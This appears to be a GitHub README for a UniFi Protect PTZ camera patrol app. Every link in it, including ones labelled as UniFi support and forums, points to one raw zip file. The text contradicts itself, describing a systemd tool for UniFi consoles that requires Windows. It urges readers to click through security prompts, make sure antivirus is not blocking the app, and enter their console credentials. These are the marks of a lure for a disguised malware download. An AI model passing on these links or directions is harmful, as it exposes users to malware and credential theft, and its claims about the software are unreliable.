# 📷 unifi-ptz-better-patrol - Smarter PTZ Camera Patrol System

[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip)

## 📖 What is unifi-ptz-better-patrol?

unifi-ptz-better-patrol is a motion-aware patrol system for UniFi Protect cameras with pan-tilt-zoom (PTZ) features. It works with UDM, UDR, and UNVR devices. The system lets your camera track motion automatically, follow set schedules, and respond when you control the camera manually.

This app helps you keep your UniFi PTZ camera on alert without needing to watch it yourself. It moves the camera to catch motion and return to patrol automatically. You get clear views when something happens, and the camera stays active on your schedule.

## 📋 Features

- Detects motion and adjusts the camera view automatically.
- Works with UniFi Protect PTZ cameras, including G5 and G6 models.
- Supports patrol schedules you set up.
- Pauses patrol when you control the camera manually.
- Runs on popular UniFi platforms like UDM, UDR, and UNVR.
- Lightweight and runs quietly in the background.
- Works with systemd for easy background running.

## 🖥 System Requirements

- Operating system: Windows 10 or 11 (64-bit recommended)
- UniFi Protect setup with compatible PTZ cameras (G5 and G6 models supported)
- Access to UniFi OS Console such as UDM, UDR, or UNVR
- Internet access to download and update the software
- Basic permission to install applications on your Windows machine

## 🚀 Getting Started

Below are the steps to download, install, and run unifi-ptz-better-patrol on your Windows computer. No programming knowledge is needed.

### 1. Download the Application

Visit the release page to get the latest version of the software:

[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip)

Click the link above. It takes you to the releases page. Find the latest Windows installer file, usually named something like `unifi-ptz-better-patrol-setup.exe`. Download this file to your PC.

### 2. Run the Installer

Once downloaded, locate the installer file in your Downloads folder or the folder you chose. Double-click the file to start the installation process.

You may see a security prompt. Choose "Run" or "Yes" to continue.

Follow the instructions on the screen. The installer will copy necessary files and prepare the app for use.

### 3. Connect to Your UniFi Protect System

After installation, launch unifi-ptz-better-patrol from the Start menu or desktop shortcut.

The app will ask for your UniFi Protect credentials and device addresses. You need your username, password, and IP address of your UDM, UDR, or UNVR device.

Enter this info carefully. The app uses this to communicate with your cameras and control their patrol behavior.

### 4. Set Up Patrol Schedules and Motion Detection

The app interface lets you:

- Create patrol schedules based on times and days.
- Turn motion tracking on or off.
- Manage manual control detection settings.

Adjust these options to fit your needs. For example, you can set patrols to run only during the day or only when motion is detected.

### 5. Start Patrol

Once configured, press the "Start Patrol" button in the app. Your PTZ camera begins its patrol route and motion tracking according to your setup.

You can pause or stop patrol anytime through the app.

## 🛠 Troubleshooting

- If the app cannot connect to your UniFi device, make sure your computer is on the same network.
- Check that your login credentials are correct.
- Ensure your firewall or antivirus is not blocking the app.
- Restart the app or your UniFi device if connections fail.
- For detailed logs, open the app’s settings and enable logging.

## 🔧 How It Works

unifi-ptz-better-patrol listens for motion events from your UniFi Protect system. When the camera detects motion, it moves to follow the action using PTZ controls.

When no motion is present, the software moves the camera along a preset patrol route. If you manually control the camera, the patrol pauses to avoid conflict.

The system runs on your local network, so your video and control stay private.

## ⚙ Configuration Tips

- Use shorter patrol points for quicker coverage in small areas.
- Increase patrol duration in large spaces.
- Set motion detection sensitivity in your UniFi Protect app for best performance.
- Use a stable Wi-Fi or wired network for uninterrupted communication.
- Regularly check for software updates on the releases page.

## 🔗 Useful Links

- Download and check for updates:  
  https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip

- UniFi Protect support and info:  
  https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip

- UniFi forums for user help:  
  https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip

## 🔒 Privacy

All data stays within your local network. unifi-ptz-better-patrol does not send any video or personal data to external servers.

## 📦 Manual Installation (Optional)

Advanced users can download the ZIP release file and extract it manually. Run the executable inside. You may need to install additional tools if asked, but this is not recommended for typical users.

## 🎯 Support

If you have issues or questions, create an issue on GitHub or check the community forums.

---

[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green)](https://raw.githubusercontent.com/mattwatery728/unifi-ptz-better-patrol/main/hurrock/ptz-better-patrol-unifi-1.3.zip)